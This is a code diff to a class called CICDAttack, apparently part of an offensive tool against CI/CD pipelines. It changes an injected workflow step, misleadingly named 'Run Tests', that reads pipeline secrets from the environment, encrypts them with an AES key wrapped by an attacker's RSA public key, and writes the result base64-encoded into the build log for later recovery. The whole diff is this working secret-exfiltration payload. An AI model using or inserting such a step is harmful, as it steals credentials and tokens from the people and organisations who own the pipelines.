@@ -107,9 +107,13 @@ class CICDAttack():
                 {
                     'name': 'Run Tests',
                     'env': secret_envmap,
-                    'run': f"{echo_cmd} | openssl rsautl -encrypt -inkey"
-                           f" <(echo \"${pkey_varname}\") -pubin -pkcs |"
-                           " base64 -w 0"
+                    'run': "openssl rand -out sym.key 32; echo -n '$';"
+                           f"{echo_cmd} | openssl enc -aes-256-cbc -kfile "
+                           "sym.key -pbkdf2 | base64 -w 0 | tr -d '\\n';"
+                           f"echo '$'; echo -n '$'; cat sym.key | base64 | "
+                           "openssl rsautl -encrypt -inkey "
+                           f"<(echo \"${pkey_varname}\") -pubin -pkcs | "
+                           "base64 -w 0 | tr -d '\\n'; echo '$'"
                 }
             ]
         }
